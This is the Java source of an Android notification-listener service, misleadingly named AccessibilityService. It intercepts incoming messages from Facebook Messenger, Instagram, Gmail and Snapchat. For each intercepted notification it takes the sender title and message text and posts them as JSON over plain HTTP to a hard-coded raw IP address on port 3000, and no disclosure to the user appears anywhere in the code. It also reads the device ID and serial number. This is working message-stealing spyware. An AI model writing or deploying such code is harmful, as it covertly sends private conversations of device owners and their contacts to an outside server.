package com.example.ssa_ezra.app;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcelable;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.support.v7.app.NotificationCompat;
import android.util.Log;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;


public class AccessibilityService extends NotificationListenerService{

    /*
     These are the package names of the apps. for which we want to
     listen the notifications
  */
    private static final class ApplicationPackageNames {
        public static final String FACEBOOK_PACK_NAME = "com.facebook.katana";
        public static final String FACEBOOK_MESSENGER_PACK_NAME = "com.facebook.orca";
        public static final String WHATSAPP_PACK_NAME = "com.whatsapp";
        public static final String INSTAGRAM_PACK_NAME = "com.instagram.android";
        public static final String GMAIL_PACK_NAME = "com.google.android.gm";
        public static final String SNAPCHAT_PACK_NAME = "com.snapchat.android";
    }

    /*
        These are the return codes we use in the method which intercepts
        the notifications, to decide whether we should do something or not
     */
    public static final class InterceptedNotificationCode {
        public static final int FACEBOOK_CODE = 1;
        public static final int GMAIL_CODE = 2;
        public static final int INSTAGRAM_CODE = 3;
        public static final int SNAPCHAT_CODE = 4;
        public static final int OTHER_NOTIFICATIONS_CODE = 10; // We ignore all notification with code == 4
    }

    public static final class CommonAppNames {
        public static final String FACEBOOK_DISPLAY = "Messenger";
        public static final String GMAIL_DISPLAY = "Gmail";
        public static final String INSTAGRAM_DISPLAY = "Instagram";
        public static final String SNAPCHAT_DISPLAY = "Snapchat";
    }

    @Override
    public IBinder onBind(Intent intent) {

        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){

        int notificationCode = matchNotificationCode(sbn);
        String appName = getAppName(sbn);
        System.out.println(appName);
        String pack = sbn.getPackageName();
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString("android.title");
        String text = extras.getCharSequence("android.text").toString();
        String subtext = "";

        if(notificationCode != InterceptedNotificationCode.OTHER_NOTIFICATIONS_CODE)
        {
            if ((Build.VERSION.SDK_INT >= Build.VERSION_CODES.N))
            {
                /* Used for SendBroadcast */
                Parcelable b[] = (Parcelable[]) extras.get(Notification.EXTRA_MESSAGES);

                if(b != null){
                    for (Parcelable tmp : b){
                        Bundle msgBundle = (Bundle) tmp;
                        subtext = msgBundle.getString("text");
                    }
                    Log.d("DetailsEzra1 :", subtext);
                }

                if(subtext.isEmpty())
                {
                    subtext = text;
                }

                Intent intent = new Intent("com.example.ssa_ezra.whatsappmonitoring");
                intent.putExtra("Notification Code", notificationCode);
                intent.putExtra("package", pack.substring(4));
                intent.putExtra("title", title);
                intent.putExtra("text", subtext);
                intent.putExtra("id", sbn.getId());


                sendBroadcast(intent);
                /* End */

                /* Used Used for SendBroadcast */
                if(text != null) {

                    if(!text.contains("new messages") && !title.contains("Chat heads active") && !text.contains("WhatsApp Web login")) {

                        String android_id = Settings.Secure.getString(getApplicationContext().getContentResolver(),
                                Settings.Secure.ANDROID_ID);
                        String devicemodel = android.os.Build.MANUFACTURER+android.os.Build.MODEL+android.os.Build.BRAND+android.os.Build.SERIAL;

                        DateFormat df = new SimpleDateFormat("ddMMyyyyHHmmssSSS");
                        String date = df.format(Calendar.getInstance().getTime());
                        /*
                        Toast.makeText(getApplicationContext(), "Notification : " + notificationCode + "\nPackages : " + pack + "\nTitle : " + title + "\nText : " + text + "\nId : " + date+ "\nandroid_id : " + android_id+ "\ndevicemodel : " + devicemodel,
                                Toast.LENGTH_LONG).show();
                        */

                        Intent intentPending = new Intent(getApplicationContext(), MainActivity.class);
                        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intentPending, 0);

                        NotificationCompat.Builder builder = (NotificationCompat.Builder) new NotificationCompat.Builder(this).setSmallIcon(R.drawable.ic_launcher_background)
                                .setContentTitle(getResources().getString( R.string.app_name ))
                                .setContentText("This is the incoming message: "+text);

                        builder.setWhen(System.currentTimeMillis());
                        builder.setSmallIcon(R.mipmap.ic_launcher);
                        Bitmap largeIconBitmap = BitmapFactory.decodeResource(getResources(), R.drawable.ic_menu_camera);
                        builder.setLargeIcon(largeIconBitmap);
                        // Make the notification max priority.
                        builder.setPriority(Notification.PRIORITY_MAX);
                        // Make head-up notification.
                        builder.setFullScreenIntent(pendingIntent, true);

                        NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                        notificationManager.notify(1, builder.build());

                        new CallAPI().execute("http://62.65.196.88:3000",String.format("{\"appTitle\":\"%s\",\"message\":\"%s\"}",getAppName(sbn),title+" - "+subtext));

                    }
                }
                /* End Used for Toast */
            }

        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn){
        int notificationCode = matchNotificationCode(sbn);

        if(notificationCode != InterceptedNotificationCode.OTHER_NOTIFICATIONS_CODE) {

            StatusBarNotification[] activeNotifications = this.getActiveNotifications();

            if(activeNotifications != null && activeNotifications.length > 0) {
                for (int i = 0; i < activeNotifications.length; i++) {
                    if (notificationCode == matchNotificationCode(activeNotifications[i])) {
                        Intent intent = new  Intent("com.example.ssa_ezra.whatsappmonitoring");
                        intent.putExtra("Notification Code", notificationCode);
                        sendBroadcast(intent);
                        break;
                    }
                }
            }
        }
    }


    public class CallAPI extends AsyncTask<String, String, String> {

        /*
        public CallAPI(){
            //set context variables if required
        }*/

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected String doInBackground(String... params) {
            String urlString = params[0]; // URL to call
            String data = params[1]; //data to post
            OutputStream out = null;

            try {
                URL url = new URL(urlString);
                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.setRequestMethod("POST");
                urlConnection.setDoOutput(true);
                urlConnection.setRequestProperty("Content-Type","application/json");

                urlConnection.connect();

                out = new BufferedOutputStream(urlConnection.getOutputStream());

                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out, "UTF-8"));
                writer.write(data);

                System.out.println("----------------- POST data to send ----------------\n"+data);
                writer.flush();
                writer.close();
                out.close();

                BufferedReader br;
                if (200 <= urlConnection.getResponseCode() && urlConnection.getResponseCode() <= 299) {
                    br = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                } else {
                    br = new BufferedReader(new InputStreamReader(urlConnection.getErrorStream()));
                }

                String s = null;
                while ((s=br.readLine())!=null)
                {
                    System.out.println(s);
                }

                urlConnection.disconnect();

            } catch (Exception e) {
                System.out.println("------------------ Error during POST message ----------------\n" + e.getMessage());
            } finally {
                return "Sent query";
            }
        }
    }

    private int matchNotificationCode(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();

        if(packageName.equals(ApplicationPackageNames.FACEBOOK_PACK_NAME)
                || packageName.equals(ApplicationPackageNames.FACEBOOK_MESSENGER_PACK_NAME)){
            return(InterceptedNotificationCode.FACEBOOK_CODE);
        } else if(packageName.equals(ApplicationPackageNames.INSTAGRAM_PACK_NAME)){
            return(InterceptedNotificationCode.INSTAGRAM_CODE);
        } else if(packageName.equals(ApplicationPackageNames.GMAIL_PACK_NAME)){
            return(InterceptedNotificationCode.GMAIL_CODE);
        } else if(packageName.equals(ApplicationPackageNames.SNAPCHAT_PACK_NAME)) {
          return(InterceptedNotificationCode.SNAPCHAT_CODE);
        } else {
            return(InterceptedNotificationCode.OTHER_NOTIFICATIONS_CODE);
        }
    }
    private String getAppName(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        System.out.println("------------------ Looking at app ---------------\n"+packageName);
        switch (packageName) {
            case ApplicationPackageNames.FACEBOOK_MESSENGER_PACK_NAME:
            case ApplicationPackageNames.FACEBOOK_PACK_NAME:
                return CommonAppNames.FACEBOOK_DISPLAY;
            case ApplicationPackageNames.GMAIL_PACK_NAME:
                return CommonAppNames.GMAIL_DISPLAY;
            case ApplicationPackageNames.SNAPCHAT_PACK_NAME:
                return CommonAppNames.SNAPCHAT_DISPLAY;
            case ApplicationPackageNames.INSTAGRAM_PACK_NAME:
                return CommonAppNames.INSTAGRAM_DISPLAY;
            default:
                return packageName;
        }
    }
}